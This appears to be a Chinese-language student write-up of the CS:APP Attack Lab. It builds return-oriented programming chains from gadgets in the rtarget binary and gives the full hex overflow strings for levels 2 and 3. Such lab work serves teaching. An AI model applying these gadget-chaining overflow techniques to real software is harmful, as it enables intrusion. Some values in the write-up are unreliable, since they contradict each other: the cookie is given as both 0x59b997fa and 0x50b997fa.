# Attack Lab
## 前期准备
## Part I
### Level 1
## Part II
### Level 2
cookie值位于0x60444，通过以下命令查询得
```bash
x /32xb $rip+0x202ce2
```
得到cookie值为

    0x59b997fa

按照与phase2相同的思路，需要将0x59b997fa填入%rdi中，再执行touch2函数。但是由于rtarget中只能使用movq,popq,ret,nop指令，所以思路如下:

```bash
pushq 0x59b997fa
popq %rax
ret
movq %rax,%rdi
ret
```

 ```
 movq %rax,%rdi
 ```
指令对应的十六进制数为48 89 c7，使用

```bash
objdump -d rtarget > rtarget.asm
```
得到rtarget的反汇编代码，查询该十六进制数串找到 setval_426 对应得序列可用

```bash
00000000004019c3 <setval_426>:
  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
  4019c9:	c3                   	retq  
```

于是

```
 movq %rax,%rdi
```

起始地址为0x4019c3+0x2=0x4019c5

同理

```
popq %rax
```
对应的十六进制数串为58，寻找得

```
00000000004019a7 <addval_219>:
  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
  4019ad:	c3                   	retq 
```
可以使用，起始地址为0x4019ad-0x2=0x4019ab

因此，最终应该填入getbuf函数为
```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
ab 19 40 00 00 00 00 00
fa 97 b9 59 00 00 00 00
c5 19 40 00 00 00 00 00
ec 17 40 00 00 00 00 00
```

### Level 3

ROP的level3与CI的level3一致，要对参数传入一个数组，也即栈中要包含该数组。那么思路应该是
```
getbuf帧段:
    movq $rsp地址+0x8,%rdi
    pushq touch3地址
    ret
test帧段:
    getbuf首地址
    cookie对应数组
```
其中cookie值为0x50b997fa

那么根据rtarget中可以使用的命令，以及在rtarget中寻找到

```
00000000004019d6 <add_xy>:
  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
  4019da:	c3                   	retq   
```

可以进行地址相加，那么应该得到的在rtarget下栈中所存代码大致应该为

```
movq %rsp,%rsi
ret 
放置0x8
popq %rdi
ret 
lea (%rdi,%rsi,1),%rax
ret 
movq %rax,%rdi
ret 
touch3的地址
cookie对应的数组
```
但是由于rtarget中不支持大部分注入movq %rsp,%rsi的操作，所以需要以下很繁琐的步骤，如下所示，那么所得到的十六进制数字串为

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
06 1a 40 00 00 00 00 00 <-movq %rsp,%rax 函数addval_190,此处为%rsp指针所指向的地方
c5 19 40 00 00 00 00 00 <-movq %rax,%rdi 函数setval_426
ab 19 40 00 00 00 00 00 <-popq %rax
48 00 00 00 00 00 00 00 <-偏移量，原本cookie与%rsp相差0x50，但因为上面有一个popq，所以偏移量变为0x48
dd 19 40 00 00 00 00 00 <-movl %eax,%edx 函数getval_481
69 1a 40 00 00 00 00 00 <-movl %edx,%ecx 函数getval_311
13 1a 40 00 00 00 00 00 <-movl %ecx,%esi 函数addval_436
d6 19 40 00 00 00 00 00 <-lea (%rdi,%rsi,1),%rax 函数add_xy
c5 19 40 00 00 00 00 00 <-movq %rax,%rdi 函数setval_426
fa 18 40 00 00 00 00 00 <-touch3
35 39 62 39 39 37 66 61 <-cookie对应字符串值
00
```
